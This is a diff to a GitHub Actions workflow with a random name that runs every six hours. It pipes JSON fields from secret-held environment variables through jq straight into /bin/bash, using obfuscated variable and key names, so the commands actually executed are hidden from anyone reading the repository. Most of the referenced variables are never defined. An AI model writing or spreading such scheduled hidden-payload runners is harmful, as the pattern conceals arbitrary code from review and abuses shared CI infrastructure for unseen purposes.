@@ -3,22 +3,26 @@ name: yushituoqie
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 0/6 * * *'
+    - cron: '13 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yushituoqie
         env:
-          ultf1: ${{ secrets.ultf1 }}
+          wxiou764: ${{ secrets.wxiou764 }}
         run: |
-          echo $ultf1 | jq -r .mifx06 | /bin/bash
-          echo $cin772 | jq -r .pi573 | /bin/bash
-          echo $xlj520 | jq -r .tolmq44 | /bin/bash
-          echo $nxr68 | jq -r .k54274 | /bin/bash
-          echo $tqky7967 | jq -r .yycb569 | /bin/bash
-          echo $gjq799 | jq -r .izs2711 | /bin/bash
-          echo $zsg81 | jq -r .ch9983 | /bin/bash
-          echo $xob16 | jq -r .z222 | /bin/bash
+          echo $wxiou764 | jq -r .uir7928 | /bin/bash
+          echo $kava80739 | jq -r .g1 | /bin/bash
+          echo $igiq88508 | jq -r .rqslb10 | /bin/bash
+          echo $ruo2 | jq -r .g11673 | /bin/bash
+          echo $udxu2281 | jq -r .j2210 | /bin/bash
+          echo $v397 | jq -r .u6 | /bin/bash
+          echo $qf4 | jq -r .d0729 | /bin/bash
+          echo $ymhfb7 | jq -r .ckawh0395 | /bin/bash
+          echo $gb85 | jq -r .ire8 | /bin/bash
+          echo $rrera404 | jq -r .ubxgy375 | /bin/bash
 
